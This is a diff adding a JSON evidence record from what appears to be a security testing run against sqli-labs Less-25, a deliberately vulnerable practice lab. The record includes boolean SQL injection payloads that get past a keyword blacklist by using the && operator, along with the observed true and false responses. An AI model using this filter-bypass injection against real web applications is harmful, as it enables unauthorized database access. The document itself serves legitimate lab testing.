@@ -1,0 +1,61 @@
+{
+  "run_id": "wp4-20261019-sqli003-low",
+  "sample_id": "SQLI-003",
+  "path_id": "Less-25/index.php?id",
+  "condition_key": "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=none|state=initialized",
+  "observations": {
+    "endpoint": "/Less-25/index.php",
+    "parameter": "id (GET)",
+    "filter": "preg_replace('/or/i','') and preg_replace('/AND/i','') only",
+    "cases": {
+      "normal": {
+        "input": "1",
+        "status": 200,
+        "login_name": "Dumb",
+        "sql_error": "",
+        "filtered_hint": "1",
+        "body_bytes": 892
+      },
+      "true": {
+        "input": "1' && '1'='1",
+        "status": 200,
+        "login_name": "Dumb",
+        "sql_error": "",
+        "filtered_hint": "1' && '1'='1",
+        "body_bytes": 903
+      },
+      "false": {
+        "input": "1' && '1'='2",
+        "status": 200,
+        "login_name": "",
+        "sql_error": "",
+        "filtered_hint": "1' && '1'='2",
+        "body_bytes": 852
+      }
+    },
+    "symbolic_and_operator_not_filtered": true,
+    "normal_row_reproduced_by_true": true,
+    "false_returns_no_row": true
+  },
+  "success_criteria": [
+    "The blacklist removes the literal words or/AND but the true && payload still returns the normal row.",
+    "The false payload, differing only in the compared constant, returns no row.",
+    "The filtered hint shows the blacklist did not remove the && operator."
+  ],
+  "limitations": [
+    "Only Less-25's GET id path is covered.",
+    "The proof relies on MySQL/MariaDB accepting && as logical AND."
+  ],
+  "artifacts": [
+    {
+      "path": "verification/evidence/wp4-20261019-sqli003-low/request.redacted.json",
+      "sha256": "4a85b48283961fa9c4bf72588eb7cd8ab87ce2cfbbd363060f9e4035f29a60f0",
+      "description": "request.redacted.json"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-sqli003-low/response.redacted.txt",
+      "sha256": "9ff7d20e37793cef4493e8e48d0b3c368925e00904275fc7ca42855063dd6df6",
+      "description": "response.redacted.txt"
+    }
+  ]
+}
